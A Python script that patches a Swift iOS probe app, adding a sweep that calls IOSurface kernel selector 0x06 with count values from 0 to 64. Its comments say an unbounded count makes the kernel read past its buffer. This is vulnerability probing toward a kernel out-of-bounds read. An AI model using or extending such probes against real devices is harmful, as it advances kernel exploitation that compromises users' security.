import re
from pathlib import Path

p = Path("ContentView-v122.swift")
t = p.read_text()

old = """        emit("=== probe done ===")"""
new = """        // ---- 0x06: create_surface_fast_path ------------------------------
        // The 32-byte structure is {u32 count, u32 values[6]}; the kernel
        // copies the values onto six fixed keys (BytesPerRow, Width, Height,
        // PixelFormat, AllocSize, Address) and loops `count` times over the
        // array.  If count is not bounded by the array size, the loop reads
        // past the end of the kernel's copy of the structure.
        var hist3: [String: Int] = [:]
        var ok3: [String] = []
        for count in 0...64 {
            var words: [UInt64] = [UInt64(count),
                                   512,          // IOSurfaceBytesPerRow
                                   64,           // IOSurfaceWidth
                                   64,           // IOSurfaceHeight
                                   0x42475241,   // IOSurfacePixelFormat (ARGB)
                                   0x10000,      // IOSurfaceAllocSize
                                   0,            // IOSurfaceAddress
                                   0]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSize: UInt64 = 0xc68
            let r: Int32 = words.withUnsafeMutableBufferPointer { wb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0x06, nil, 0, UnsafeRawPointer(wb.baseAddress!), 0x20,
                               ob.baseAddress, &outSize)
                }
            }
            let k = krN(r)
            hist3[k, default: 0] += 1
            if r == 0 {
                ok3.append("count=\\(count) outSize=0x\\(String(outSize, radix: 16)) head=\\(out.prefix(16).map { String(format: "%02x", $0) }.joined())")
            }
        }
        emit("sel0x06 fast-path count sweep 0...64: " + hist3.map { "\\($0.key)=\\($0.value)" }.joined(separator: " "))
        for o in ok3 { emit("   0x06 OK " + o) }
        emit("=== probe done ===")"""
assert old in t
t = t.replace(old, new)
p.write_text(t)
print("patched: 0x06 fast-path count sweep")
